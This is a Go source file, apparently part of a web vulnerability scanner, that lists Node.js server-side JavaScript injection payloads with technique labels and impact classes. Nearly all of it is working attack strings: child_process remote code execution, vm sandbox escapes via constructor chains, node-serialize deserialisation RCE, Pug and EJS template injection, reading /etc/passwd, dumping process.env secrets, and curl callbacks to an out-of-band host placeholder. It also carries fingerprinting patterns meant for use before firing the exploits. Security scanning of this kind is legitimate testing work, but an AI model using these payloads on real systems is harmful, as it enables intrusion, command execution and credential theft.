// Package nodejsinject provides Server-Side JavaScript Injection (SSJI)
// payloads targeting Node.js sinks.
//
// SSJI is distinct from PHP/Python code injection because Node.js exposes
// a very different sink surface: `eval` and `Function()` are common, but
// the most exploited primitives are sandbox escapes via the `vm` module
// (`constructor.constructor`, `this.constructor` chains), `child_process`
// access via `process.mainModule.require`, and serialised-callback abuse
// in the `node-serialize` package (the `_$$ND_FUNC$$_` magic).
//
// Mirrors AWVS NodeJs_Injection.script.
//
// References: Synode (NDSS '18), HackTricks NodeJS injection chapter,
// node-serialize CVE-2017-5941, OWASP Cheat Sheet "Code injection".
package nodejsinject

// Impact classifies the resulting capability of a successful injection.
type Impact string

const (
	ImpactRCE        Impact = "rce"
	ImpactSandboxEsc Impact = "sandbox_escape"
	ImpactInfoLeak   Impact = "info_leak"
	ImpactBlind      Impact = "blind"
)

// Payload represents one NodeJS SSJI payload.
type Payload struct {
	Value       string
	Technique   string // short technique label
	Impact      Impact
	Description string
}

// GetPayloads returns all NodeJS SSJI payloads.
func GetPayloads() []Payload {
	return payloads
}

// GetByImpact returns payloads filtered by impact bucket.
func GetByImpact(impact Impact) []Payload {
	var out []Payload
	for _, p := range payloads {
		if p.Impact == impact {
			out = append(out, p)
		}
	}
	return out
}

// GetErrorPatterns returns response substrings that confirm a Node.js
// runtime is parsing the request — useful for fingerprinting before
// firing exploit payloads.
func GetErrorPatterns() []string {
	return errorPatterns
}

var payloads = []Payload{
	// --- eval() / inline RCE ---
	{
		Value:       `require('child_process').exec('id')`,
		Technique:   "eval_child_process",
		Impact:      ImpactRCE,
		Description: "eval() → child_process.exec direct RCE",
	},
	{
		Value:       `require('child_process').execSync('id').toString()`,
		Technique:   "eval_child_process_sync",
		Impact:      ImpactRCE,
		Description: "Synchronous child_process for reflected output",
	},
	{
		Value:       `require('child_process').execSync('curl http://{OAST_HOST}/n')`,
		Technique:   "child_process_oob",
		Impact:      ImpactBlind,
		Description: "OOB callback via curl (no output reflection needed)",
	},

	// --- Function() constructor RCE (works where eval is blocked) ---
	{
		Value:       `Function('return require')()('child_process').exec('id')`,
		Technique:   "function_constructor_rce",
		Impact:      ImpactRCE,
		Description: "Function() constructor → require → child_process",
	},
	{
		Value:       `(function(){return Function})()('return require("child_process").exec("id")')()`,
		Technique:   "function_constructor_chained",
		Impact:      ImpactRCE,
		Description: "Chained Function() to defeat partial filters",
	},

	// --- vm module sandbox escape via constructor chain (Synode) ---
	{
		Value:       `this.constructor.constructor("return process")().mainModule.require("child_process").exec("id")`,
		Technique:   "vm_escape_this_constructor",
		Impact:      ImpactSandboxEsc,
		Description: "vm escape via this.constructor.constructor chain",
	},
	{
		Value:       `''.constructor.constructor("return process")().mainModule.require("child_process").exec("id")`,
		Technique:   "vm_escape_string_constructor",
		Impact:      ImpactSandboxEsc,
		Description: "vm escape via String prototype constructor chain",
	},
	{
		Value:       `({}).constructor.constructor("return process.mainModule.require('child_process').exec('id')")()`,
		Technique:   "vm_escape_object_constructor",
		Impact:      ImpactSandboxEsc,
		Description: "vm escape via Object constructor chain",
	},

	// --- global.process leak (info-leak before pivot) ---
	{
		Value:       `global.process.env`,
		Technique:   "global_process_env",
		Impact:      ImpactInfoLeak,
		Description: "Leak process env (often contains DB creds, tokens)",
	},
	{
		Value:       `global.process.mainModule.require('fs').readFileSync('/etc/passwd').toString()`,
		Technique:   "process_fs_read",
		Impact:      ImpactInfoLeak,
		Description: "fs.readFileSync /etc/passwd via process.mainModule",
	},

	// --- setTimeout/setInterval eval-via-string (Function ctor under the hood) ---
	{
		Value:       `setTimeout("require('child_process').exec('id')",0)`,
		Technique:   "settimeout_eval",
		Impact:      ImpactRCE,
		Description: "setTimeout(string,…) eval-via-string variant",
	},
	{
		Value:       `setInterval("require('child_process').exec('curl {OAST_HOST}')",0)`,
		Technique:   "setinterval_oob",
		Impact:      ImpactBlind,
		Description: "setInterval eval-via-string OOB",
	},

	// --- node-serialize CVE-2017-5941: IIFE in JSON ---
	{
		Value:       `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });}()"}`,
		Technique:   "node_serialize_iife",
		Impact:      ImpactRCE,
		Description: "node-serialize _$$ND_FUNC$$_ IIFE deserialisation RCE",
	},

	// --- process.binding('spawn_sync') sandbox primitive (newer Node) ---
	{
		Value:       `process.binding('spawn_sync').spawn({file:'/usr/bin/id',args:['id'],stdio:[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}]})`,
		Technique:   "process_binding_spawn",
		Impact:      ImpactRCE,
		Description: "process.binding('spawn_sync') low-level RCE",
	},

	// --- timer-based time-blind probe ---
	{
		Value:       `require('child_process').execSync('sleep 5')`,
		Technique:   "time_based_sleep",
		Impact:      ImpactBlind,
		Description: "Time-based confirm-vuln via execSync('sleep 5')",
	},

	// --- Express-template-engine specific (pug, ejs, handlebars helper RCE) ---
	{
		Value:       `#{root.process.mainModule.require('child_process').execSync('id')}`,
		Technique:   "pug_interpolation_rce",
		Impact:      ImpactRCE,
		Description: "Pug template #{...} interpolation → mainModule RCE",
	},
	{
		Value:       `<%= global.process.mainModule.require('child_process').execSync('id').toString() %>`,
		Technique:   "ejs_interpolation_rce",
		Impact:      ImpactRCE,
		Description: "EJS <%= … %> tag → mainModule RCE",
	},
}

var errorPatterns = []string{
	"SyntaxError",                 // JS parser error
	"ReferenceError",              // undefined var
	"TypeError",                   // type coercion fail
	"Node.js",                     // explicit Node mention in stack
	"node:vm",                     // node:vm: prefix in newer Node
	"at node:vm.runIn",            // vm module stack frame in Node 16+
	"V8 javascript",               // V8 engine fingerprint
	"node-serialize",              // CVE-2017-5941 surface
}
